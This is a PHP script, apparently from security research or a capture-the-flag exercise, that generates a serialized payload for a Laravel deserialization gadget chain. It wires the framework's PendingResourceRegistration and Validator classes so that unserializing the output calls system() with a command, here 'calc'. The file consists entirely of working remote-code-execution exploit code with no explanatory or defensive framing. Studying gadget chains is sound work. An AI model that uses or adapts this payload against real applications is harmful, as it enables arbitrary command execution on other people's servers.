<?php
/*
# -*- coding: utf-8 -*-
# @filename: pop5-rce.php
# @author: diggid
*/
namespace Illuminate\Routing{
    class PendingResourceRegistration{
        protected $registered = false;
        protected $registrar;
        protected $name = array("diggid"=>"calc");
        protected $controller = array("diggid"=>"diggid");
        protected $options = "system";
        public function __construct($a)
        {
            $this->registrar = $a;
        }
    }
}
namespace Illuminate\Validation{
    class Validator{
        public $extensions;
        public function __construct($a)
        {
            $this->extensions = $a;
        }
    }
}

namespace {
    $b = new Illuminate\Validation\Validator(array(""=>"array_udiff"));
    $c = new Illuminate\Routing\PendingResourceRegistration($b);
    echo urlencode(serialize($c));
}